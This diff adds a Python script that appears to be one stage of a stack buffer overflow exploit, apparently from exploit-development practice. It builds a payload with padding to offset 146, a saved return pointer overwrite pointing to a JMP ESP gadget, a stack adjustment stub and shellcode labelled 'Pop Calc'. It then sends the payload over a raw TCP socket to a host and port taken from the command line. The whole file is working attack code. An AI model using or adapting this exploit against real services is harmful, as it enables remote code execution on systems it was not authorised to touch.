@@ -1,0 +1,67 @@
+#!/usr/bin/env python3
+# stage 6 verify RET 
+import socket,sys,struct
+
+
+RHOST = sys.argv[1]
+RPORT = int(sys.argv[2])
+
+
+# Pop Calc
+shellcode =  b""
+shellcode += b"\xd9\xc9\xbf\x03\xbc\x9e\x85\xd9\x74\x24\xf4"
+shellcode += b"\x5d\x33\xc9\xb1\x31\x31\x7d\x18\x03\x7d\x18"
+shellcode += b"\x83\xc5\x07\x5e\x6b\x79\xef\x1c\x94\x82\xef"
+shellcode += b"\x40\x1c\x67\xde\x40\x7a\xe3\x70\x71\x08\xa1"
+shellcode += b"\x7c\xfa\x5c\x52\xf7\x8e\x48\x55\xb0\x25\xaf"
+shellcode += b"\x58\x41\x15\x93\xfb\xc1\x64\xc0\xdb\xf8\xa6"
+shellcode += b"\x15\x1d\x3d\xda\xd4\x4f\x96\x90\x4b\x60\x93"
+shellcode += b"\xed\x57\x0b\xef\xe0\xdf\xe8\xa7\x03\xf1\xbe"
+shellcode += b"\xbc\x5d\xd1\x41\x11\xd6\x58\x5a\x76\xd3\x13"
+shellcode += b"\xd1\x4c\xaf\xa5\x33\x9d\x50\x09\x7a\x12\xa3"
+shellcode += b"\x53\xba\x94\x5c\x26\xb2\xe7\xe1\x31\x01\x9a"
+shellcode += b"\x3d\xb7\x92\x3c\xb5\x6f\x7f\xbd\x1a\xe9\xf4"
+shellcode += b"\xb1\xd7\x7d\x52\xd5\xe6\x52\xe8\xe1\x63\x55"
+shellcode += b"\x3f\x60\x37\x72\x9b\x29\xe3\x1b\xba\x97\x42"
+shellcode += b"\x23\xdc\x78\x3a\x81\x96\x94\x2f\xb8\xf4\xf2"
+shellcode += b"\xae\x4e\x83\xb0\xb1\x50\x8c\xe4\xd9\x61\x07"
+shellcode += b"\x6b\x9d\x7d\xc2\xc8\x41\x9c\xc7\x24\xea\x39"
+shellcode += b"\x82\x85\x77\xba\x78\xc9\x81\x39\x89\xb1\x75"
+shellcode += b"\x21\xf8\xb4\x32\xe5\x10\xc4\x2b\x80\x16\x7b"
+shellcode += b"\x4b\x81\x74\x1a\xdf\x49\x55\xb9\x67\xeb\xa9"
+
+
+# handle payload 
+offset = 146
+total_buff_size = 650 
+pointer_to_jmp_esp = 0x080414C3 
+
+
+# move ESP up the stack
+sub_esp_10 = b"\x83\xec\x10"
+
+buff          = b""
+lead_padding  = b"\x41" * (offset - len(buff))                 # begin buffer padding
+eip           = struct.pack("<I", pointer_to_jmp_esp)          # saved return pointer overwrite (EIP/SRP) 
+esp           = sub_esp_10                                     # where esp should be pointing
+trail_padding = b"\x44" * (total_buff_size - len(buff))
+postfix       = b"\n"              
+
+
+# handle payload
+buff += lead_padding 
+buff += eip 
+buff += esp 
+buff += shellcode
+buff += trail_padding 
+buff += postfix
+
+
+# handle connection
+print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+s.send(buff)
+s.close()
